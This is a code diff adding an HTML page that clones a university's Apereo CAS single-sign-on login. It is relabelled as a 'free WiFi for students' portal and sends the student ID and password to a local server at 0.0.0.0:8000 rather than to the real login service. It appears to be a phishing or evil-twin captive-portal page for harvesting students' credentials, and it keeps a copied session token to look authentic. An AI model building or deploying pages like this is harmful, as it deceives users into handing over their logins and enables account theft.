@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>CAS &#8211; Central Authentication Service</title>
+
+    <meta name="_csrf" content="" />
+    <meta name="_csrf_header" content="" />
+
+    <link rel="stylesheet" href="./cas.css" />
+    <link rel="icon" href="./favicon.ico" type="image/x-icon" />
+  </head>
+  <body id="cas">
+    <div id="container">
+      <header>
+        <a id="logo" href="http://www.apereo.org" title="go to Apereo home page"
+          >Apereo</a
+        >
+        <h1>Central Authentication Service (CAS)</h1>
+      </header>
+      <div id="content">
+        <div id="cookiesDisabled" class="errors" style="display: none">
+          <h2>Browser cookies disabled</h2>
+          <p>
+            Your browser does not accept cookies. Single Sign On WILL NOT WORK.
+          </p>
+        </div>
+
+        <div class="box" id="login">
+          <form id="fm1" action="http://0.0.0.0:8000/login" method="post">
+            <h2>Free WiFi untuk mahasiswa</h2>
+
+            <section class="row">
+              <label for="username"
+                ><span class="accesskey">U</span>sername (NIM): </label
+              >
+
+              <input
+                id="username"
+                name="nim"
+                class="required"
+                tabindex="1"
+                accesskey="u"
+                type="text"
+                value=""
+                size="25"
+                autocomplete="off"
+              />
+            </section>
+
+            <section class="row">
+              <label for="password"
+                ><span class="accesskey">P</span>assword:</label
+              >
+
+              <input
+                id="password"
+                name="nim"
+                class="required"
+                tabindex="2"
+                accesskey="p"
+                type="password"
+                value=""
+                size="25"
+                autocomplete="off"
+              />
+              <span id="capslock-on" style="display: none"
+                ><p>
+                  <img src="images/warning.png" valign="top" /> CAPSLOCK key is
+                  turned on!
+                </p></span
+              >
+            </section>
+
+
+            <section class="row btn-row">
+              <input
+                type="hidden"
+                name="execution"
+                value="b2e610aa-0d6f-49ca-b85e-0973998b3ffc_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuVjNWTVRXOTVWWFZyVVdWc1RqZEJOMVZvTWk5V0wzRmFVbU12YXl0T1FYSXhUVW8yWmxWdE1rbFVja1I2UWpsa0wzVk1TMlJxVVVoWFp5dDRaMkZZZW5ORE5GQnFOVVpqTlcxTFZIRklhMkpyY0c4NFVEWmxkRU5HVWtnd1oxaE9WR2h6WmxkVk9IRnFNRUpQYlRGTVUxRTFLelJuVVdGQlNtWm1hVTVUVTBWaVJqUnJhbGxTZVRkMUwzcHRWVk5aWWxoSFdFVmpVVU5LZDNsRk0yRkVaMkU0UTJoQk1raHJZVVpsVVRKM1VsaE5TMlowYmxSYU0zbEVTakF3UkdKeWRVWlZUVGx3YW5CUFlXRlJRMkk1UjJodlEzVkZSSFE0ZVRZemMydDViR2c1UTNFNEwwTkNVVGswVUc1UFpYUjJUUzlxZFZSTVUwWkRRMUpUUTJ3ME0zWnFVRFV3UW5wcVZYbzVNMWRrTjBKNVdGbFNVMVp2VmxkRlV6ZzNZV2h0TlhoR1Z5OVJWMWxQUVc1TGJuWkRjSEo0Vm14bE5IbFhLekZtVWxVeGRraE5ibXBRYkZCdVYwZ3ZPREJTTjBseE5tWnNhR3RNTlhSdGVXNUdhVlZSUkRsSWFHTTNhV1ZsTURaUWVEVnFaWGw2YUZKWFEwdENiVVpYUTBOVE5qVkhXRUp0Y1RKNWVIRnJka0phVFRaRVkxVnBOVFJyYTJGdWFubFRUbVJVY21ST2JXaFZjazVqYkRkWlJHcGtORmwzY0VWVGVEUk9VM0Z0YUZKdmRrWnlWV3RtU0RoWlpFNHZhWFpHZDI5d2JYSnhjR1ZoTDB4aVpWWkdjbTFSWWk5YVRHZGFTV0k1WjI4MmFHSlhMM1U1T1RWV09VeENVMDVJUzJwWlduTmtjR1ZCY0cxa05uaFJPVU1yUWtKQmFGQm5OMmR2Tms5TE9WaG5SbnBNU0hCTlNVRnlZbUlyT1RkblZXMXpjVWhZV2tob1VXTnRVVEJHYVV0dFMwVXJOVWd3V0dZNUswMHZORko1WkZOdWMxZDFPWGwyV0RjME1GQkdRazl1ZVdRNVlsTkdXa3BGWlZwV2RFNTFVazUxUmpGamJqZ3JkMVY0Vm1wQmIwZHBlbEJwV0RkMGFXaFJhazFGVkVaQldYbDBaamd2Vm01bWMyWXJVbmhoUXpCWlRWcElUM0JQV1hsMmNHMW1SSGM0YWtwNlJFWjFXV3RyVFd4VlFscEtSelp4TjJ4V1FqTjVjMWgwY2paM1prTXpOa0pEYm1OUVVFNUVNa0ppVW5sNVpFTmhUVmg1TkZacmFISnNRVmN3YlUxc1UxUjNUMHRZTW1oM2JITXJSbmhhWVUweFVVSTBha3RTTURkd1NGWkZVRTVzVFhCRlFVbGtNVGxJUWs1MmJXOWxWMHh5Y0VSeldqQmlNV3hqY0d0UVNHOW9kVWRFVG1STFpISlZNM04yZWtKaVNDODRlVkozUVdwU04wRjBjR3MwVlM5blJVRnBiRE5uYWpCWlJqRTNVVkpKWjA5T1JqZGtNRVJ6VDFkSlVFWTJkWFJVWlRkalFXdGtVbUp4U0daaE0ya3ZhWGt5VGxWdmIwOTNUbWhUY21RNFFUVlBXbnBNV1hWdFkwcGtXRXRUUmpJNVZXVk9VMHBQU1ZKelBRLmZZWm1UUGNiY2hLc0RiRHotaHhRYXJjNWdQSVRxcVMwb2pwd1daZVEtbFdxSlRzSHd3LVBsVnNxRXBQZTV6S21nVlhNV2RJRkpncGhIMFlGLUQ3MEJn"
+              />
+              <input type="hidden" name="_eventId" value="submit" />
+
+              <input
+                class="btn-submit"
+                name="submit"
+                accesskey="l"
+                value="LOGIN"
+                tabindex="6"
+                type="submit"
+              />
+              <input
+                class="btn-reset"
+                name="reset"
+                accesskey="c"
+                value="CLEAR"
+                tabindex="7"
+                type="reset"
+              />
+            </section>
+          </form>
+        </div>
+
+        <div id="sidebar">
+          <div class="sidebar-content">
+            
+
+            <h2>Selamat datang di Single Sign On (SSO)</h2>
+            <img
+              src="images/logo-toga.png"
+              alt=""
+              class="pull-left thumbnail"
+              style="margin-right: 15px; float: left"
+              width="180"
+            />
+            <p style="text-align: justify">
+              Seiring dengan sistem manajemen terintegrasi, SSO merupakan salah
+              satu gerbang integrasi berbagai aplikasi yang diberdayakan untuk
+              civitas.
+            </p>
+            <p style="text-align: justify">
+              Semoga SSO ini dapat mempermudah civitas dalam memberdayakan dan
+              menganalisis hasil aplikasi yang ada, serta untuk terus
+              menyempurnakan dari berbagai aspek.
+            </p>
+          </div>
+        </div>
+      </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/headjs/1.0.3/head.min.js"></script>
+
+    <script type="text/javascript" src="./cas.js"></script>
+  </body>
+</html>
